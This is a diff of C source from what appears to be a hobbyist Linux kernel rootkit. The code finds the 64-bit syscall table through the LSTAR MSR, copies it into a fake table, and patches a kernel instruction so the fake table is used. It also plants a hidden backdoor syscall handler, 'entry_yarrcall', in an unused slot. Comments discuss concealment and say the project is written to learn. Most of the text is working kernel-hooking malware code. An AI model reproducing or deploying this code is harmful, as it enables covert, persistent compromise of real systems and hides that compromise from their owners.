@@ -9,20 +9,25 @@
 #include "log.h"
 #include "utils.h"
 #include "patch.h"
+#include "yarrcall.h"
 
-// TODO: Document all the functions using Doxygen format.
-
-// Backup where we store the original sys_call_table.
-unsigned long *sys_call_table_backup = NULL;
-unsigned char *do_syscall_64_patch_addr = NULL;
+// TODO: Lookup for sys_ni_syscall.
+unsigned long sys_ni_syscall = 0xffffffff920bf2d0;
+//unsigned long sys_ni_syscall = 0xffffffff8b6bf2d0;
 
 // Our fake sys_call_table.
-unsigned long fake_sct[__NR_syscall_max+1];
+unsigned long __fake_sct[__NR_syscall_max+1];
 
+/**
+ * Internal. Does all the work needed to locate the 64-bit sys_call_table and
+ * hook it with our fake sys_call_table.
+ *
+ * @return: Zero on success, non-zero elsewhere.
+ */
 int __hook_syscall_table_64(void) {
     unsigned char *entry_SYSCALL_64, *do_syscall_64, *addr_e8, *addr_8b;
-    int displacement, sct_addr_encoded, i, err;
-    unsigned long addr;
+    int displacement, sct_addr_encoded, i, err, yarrcall_installed;
+    unsigned long addr, *sys_call_table;
     int32_t fake_sct_addr;
 
     // Get the address of the LSTAR MSR, it contains the entry point of
@@ -74,22 +79,30 @@ int __hook_syscall_table_64(void) {
     // Now we know the address of sys_call_table, back it up for when we
     // unload. We promote first to long so there's sign extension and then to 
     // pointer so we omit a warning.
-    sys_call_table_backup = (void *)(long)sct_addr_encoded;
-    yarr_log("sys_call_table found at 0x%px", sys_call_table_backup);
-    yarr_log("fake sct is at 0x%px", fake_sct);
+    sys_call_table = (void *)(long)sct_addr_encoded;
 
-    // Fulfill our fake sys_call_table with the real syscalls.
+    // Fulfill our fake sys_call_table with the real syscalls. Additionally
+    // when we find an entry with sys_ni_syscall (not-implemented syscall)
+    // install there entry_yarrcall().
+    yarrcall_installed = 0;
     for (i = 0; i < __NR_syscall_max + 1; i++) {
-        fake_sct[i] = sys_call_table_backup[i];
+        if (!yarrcall_installed && sys_call_table[i] == sys_ni_syscall) {
+            __fake_sct[i] = (unsigned long)entry_yarrcall;
+
+            // TODO: This is a sign we leave and that can be traced, I
+            // shouldn't do this for the sake of concealment, but I'm
+            // programming this thing for me and to learn, so I don't
+            // care.
+            yarrcall_installed = 0x01ec0ded;
+            continue;
+        }
+
+        __fake_sct[i] = sys_call_table[i];
     }
 
     // Now we patch the instruction from where we got the sys_call_table
     // with our fake sys_call_table.
-    //
-    // TODO: This global should disappear when the patch subsystem is
-    // developed.
-    do_syscall_64_patch_addr = addr_8b + 3;
-    fake_sct_addr = get_low_4_bytes((unsigned long)&fake_sct);
+    fake_sct_addr = get_low_4_bytes((unsigned long)&__fake_sct);
     err = patch((unsigned char *)(addr_8b + 3),
             (unsigned char *)&(fake_sct_addr),
             4);
@@ -101,6 +114,11 @@ int __hook_syscall_table_64(void) {
     return 0;
 }
 
+/**
+ * Hooks both 32 and 64-bit system call tables.
+ *
+ * @return: Zero on success, non-zero elsewhere.
+ */
 int hook_syscall_tables(void) {
     int err;
 
